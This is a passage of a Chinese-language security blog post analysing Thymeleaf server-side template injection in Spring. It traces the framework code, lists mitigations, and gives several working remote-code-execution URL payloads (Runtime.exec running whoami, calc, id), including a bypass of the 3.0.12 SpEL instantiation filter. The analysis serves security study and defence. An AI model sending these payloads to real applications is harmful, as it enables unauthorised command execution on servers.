punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="构造回显"><a href="#构造回显" class="headerlink" title="构造回显"></a>构造回显</h3><p>templatename部分可控，没回显的原因在于defaultView中对URI path的处理，为了解决这个问题，我们可以在payload的最后加两个<code>.</code></p><p>payload：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>doc<span class="token operator">/</span>__$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>whoami<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span>__<span class="token operator">::</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要注意的是<code>::</code>必须放在后面，放在前面虽然可以执行命令，但是没有回显，类似于templatename和selector的区别</p><p>造成这个问题的地方在<code>StandardExpressionParser#parseExpression</code>，<strong>在<code>preprocess</code>预处理结束后</strong>还会再走<code>Expression.parse</code>进行一次解析，这里如果解析失败则不会回显</p><p>现在来使用<code>::.x</code>结尾的payload：</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711022303079.png" alt="image-20240711022303079"></p><p>可以看到这里<code>::</code>后面是没有内容的，因此解析后expression的值为null，所以最终会抛出<code>IllegalArgumentException</code>异常，携带的异常信息只包含了我们输入的内容, 并没有命令的回显</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711103449462.png" alt="image-20240711103449462"></p><br><p>而使用<code>::..</code>结尾的payload：</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711022515345.png" alt="image-20240711022515345"></p><p>这一步是正常解析出了expression，值变成 FragmentExpression</p><p>之后返回到 <code>ThymeleafView#renderFragment</code> 方法, 往下会将表达式执行结果作为 templateName，并提取出 <code>::</code> 后面的内容作为 selector</p><p>然后调用 <code>viewTemplateEngine.process()</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711104350408.png" alt="image-20240711104350408"></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711105057414.png" alt="image-20240711105057414"></p><p>跟进 <code>TemplateManager#resolveTemplate</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711105238882.png" alt="image-20240711105238882"></p><p>templateResolver 负责在 classpath (prefix) 下依据 template (name) 和 suffix 寻找对应的模板文件</p><p>这里肯定是找不到的, 所以会抛出 TemplateInputException 异常, 但是这个异常会带出 tempate 名称并最终显示在 500 页面中, 因此达到了回显的效果</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711105820284.png" alt="image-20240711105820284"></p><hr><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>现在分析一下为什么<code>::.x</code>会被去掉：</p><p>在分析<code>URI PATH</code>这种方式能获取<code>ModelAndView</code>的原因时，我们分析过在<code>applyDefaultViewName</code>中获取URI Path作为<code>ModelAndView</code>的name，这个操作在<code>DefaultRequestToViewNameTranslator#getViewName</code>中完成</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711024115948.png" alt="image-20240711024115948"></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711024130741.png" alt="image-20240711024130741"></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711024213451.png" alt="image-20240711024213451"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getViewName</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> lookupPath <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>urlPathHelper<span class="token punctuation">.</span><span class="token function">getLookupPathForRequest</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> <span class="token class-name">HandlerMapping</span><span class="token punctuation">.</span><span class="token constant">LOOKUP_PATH</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>prefix <span class="token operator">+</span> <span class="token function">transformPath</span><span class="token punctuation">(</span>lookupPath<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>suffix<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>getLookupPathForRequest</code>仅仅获取了请求的地址并没有对后面的<code>.x</code>做处理，处理主要是在<code>transformPath</code>中完成的</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711024400363.png" alt="image-20240711024400363"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Nullable</span><span class="token keyword">protected</span> <span class="token class-name">String</span> <span class="token function">transformPath</span><span class="token punctuation">(</span><span class="token class-name">String</span> lookupPath<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> path <span class="token operator">=</span> lookupPath<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stripLeadingSlash <span class="token operator">&amp;&amp;</span> path<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token constant">SLASH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>path <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stripTrailingSlash <span class="token operator">&amp;&amp;</span> path<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token constant">SLASH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>path <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stripExtension<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>path <span class="token operator">=</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">stripFilenameExtension</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">SLASH</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>separator<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>path <span class="token operator">=</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token constant">SLASH</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>separator<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> path<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711024501146.png" alt="image-20240711024501146"></p><p><code>stripFilenameExtension</code>会去除最后一个<code>.</code>后的内容，所以可以通过下面的方式绕过</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>doc<span class="token operator">/</span>__$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span>__<span class="token operator">::</span><span class="token function">assadasd</span><span class="token punctuation">.</span>asdas<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>总之就是让<code>::</code>后面有内容才能实现回显</p><hr><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><h2 id="配置ResponseBody或RestController注解"><a href="#配置ResponseBody或RestController注解" class="headerlink" title="配置ResponseBody或RestController注解"></a>配置ResponseBody或RestController注解</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/doc/&#123;document&#125;"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">getDocument</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">String</span> document<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Retrieving "</span> <span class="token operator">+</span> document<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//returns void, so view name is taken from URI</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配置了<code>ResponseBody</code>注解后，在<code>applyDefaultViewName</code>中<code>ModelAndView</code>是<code>Null</code>而非<code>ModelAndView</code>对象，所以<code>hasView()</code>会导致异常，不会设置视图名</p><p>原因是设置了<code>ResponseBody</code>注解后，handler返回的是<code>RequestResponseBodyMethodProcesser</code>，所以这里会调用它的<code>handleReturnValue</code>，设置了<code>RequestHandled</code>属性为True</p><p>此方法也适用于<code>templatename</code>，在设置了<code>RequestHandled</code>属性后，<code>ModelAndView</code>一定会返回Null</p><p>这样 spring 框架就不会将其解析为视图名，而是直接返回，不再调用模板解析</p><hr><h2 id="通过redirect"><a href="#通过redirect" class="headerlink" title="通过redirect:"></a>通过redirect:</h2><blockquote><p>根据springboot定义，如果名称以<code>redirect:</code>开头，则不再调用<code>ThymeleafView</code>解析，调用<code>RedirectView</code>去解析<code>controller</code>的返回值</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/safe/redirect"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> url<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token string">"redirect:"</span> <span class="token operator">+</span> url<span class="token punctuation">;</span> <span class="token comment">//FP as redirects are not resolved as expressions</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="方法参数中设置HttpServletResponse-参数"><a href="#方法参数中设置HttpServletResponse-参数" class="headerlink" title="方法参数中设置HttpServletResponse 参数"></a>方法参数中设置HttpServletResponse 参数</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/doc/&#123;document&#125;"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">getDocument</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">String</span> document<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Retrieving "</span> <span class="token operator">+</span> document<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析</p><hr><h1 id="其它姿势"><a href="#其它姿势" class="headerlink" title="其它姿势"></a>其它姿势</h1><h2 id="位置"><a href="#位置" class="headerlink" title="::位置"></a>::位置</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">::</span><span class="token function">__</span>$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>open<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span>a<span class="token operator">%</span><span class="token number">20</span>calculator<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span>__<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="省略"><a href="#省略" class="headerlink" title="省略__"></a>省略__</h2><p>当Controller如下配置时，可以省略<code>__</code>包裹</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/path"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">path2</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> lang<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> lang<span class="token punctuation">;</span> <span class="token comment">//template path is tainted</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>即去掉了前后缀</p><p>payload：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>open<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span>a<span class="token operator">%</span><span class="token number">20</span>calculator<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span><span class="token operator">::</span><span class="token punctuation">.</span>x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="高版本下的bypass"><a href="#高版本下的bypass" class="headerlink" title="高版本下的bypass"></a>高版本下的bypass</h1><p>在<strong>3.0.12</strong>版本，Thymeleaf 在 <code>util</code>目录下增加了一个名为<code>SpringStandardExpressionUtils.java</code>的文件</p><p>当调用表达式的时候，会经过该函数的判断：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">containsSpELInstantiationOrStatic</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> expression<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">final</span> <span class="token keyword">int</span> explen <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> explen<span class="token punctuation">;</span>        <span class="token keyword">int</span> ni <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// index for computing position in the NEW_ARRAY</span>        <span class="token keyword">int</span> si <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> c<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>n<span class="token operator">--</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            c <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>ni <span class="token operator">&lt;</span> <span class="token constant">NEW_LEN</span>                    <span class="token operator">&amp;&amp;</span> c <span class="token operator">==</span> <span class="token constant">NEW_ARRAY</span><span class="token punctuation">[</span>ni<span class="token punctuation">]</span>                    <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>ni <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;</span> explen<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isWhitespace</span><span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                ni<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>ni <span class="token operator">==</span> <span class="token constant">NEW_LEN</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isJavaIdentifierPart</span><span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment">// we found an object instantiation</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>ni <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                n <span class="token operator">+=</span> ni<span class="token punctuation">;</span>                ni <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>si <span class="token operator">&lt;</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token comment">// This has to be restarted too</span>                    si <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            ni <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token char">')'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                si <span class="token operator">=</span> n<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>si <span class="token operator">></span> n <span class="token operator">&amp;&amp;</span> c <span class="token operator">==</span> <span class="token char">'('</span>                        <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">'T'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isJavaIdentifierPart</span><span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>si <span class="token operator">></span> n <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isJavaIdentifierPart</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token char">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                si <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到其主要逻辑是：首先倒序检测是否包含<code>wen</code>关键字、在<code>(</code>的左边的字符是否是<code>T</code>，如包含，那么认为找到了一个实例化对象，返回<code>true</code>，阻止该表达式的执行</p><p>因此要绕过这个函数，只要满足三点：<br>1、表达式中不能含有关键字<code>new</code><br>2、在<code>(</code>的左边的字符不能是<code>T</code><br>3、不能在<code>T</code>和<code>(</code>中间添加的字符使得原表达式出现问题</p><p>关于这个的绕过方法是<code>%20</code>，<code>%0a</code>，<code>%09</code></p><p>最终payload：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>path<span class="token punctuation">;</span><span class="token operator">/</span>__$<span class="token punctuation">&#123;</span><span class="token function">t</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>runtime<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getruntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>__<span class="token operator">::</span><span class="token punctuation">.</span>x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>path<span class="token comment">//__$&#123;t(java.lang.runtime).getruntime().exec("calc")&#125;__::.x</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意：命令执行的payload 中不能含有<code>/</code></p><hr><h1 id="2-x版本"><a href="#2-x版本" class="headerlink" title="2.x版本"></a>2.x版本</h1><p>片段表达式 <code>~&#123; &#125;</code>这个特性是在 3.0 版本引入的，但是其实 2.x 版本也能触发漏洞</p><p>同样存在 preprocess 方法来处理预处理表达式</p><p>对于不含预处理表达式的 payload, 同样能够执行, 只是位置不太一样</p><hr><h1 id="其它的payload"><a href="#其它的payload" class="headerlink" title="其它的payload"></a>其它的payload</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java">__$<span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"id"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>__<span class="token operator">::</span><span class="token function">x</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java">__$<span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token 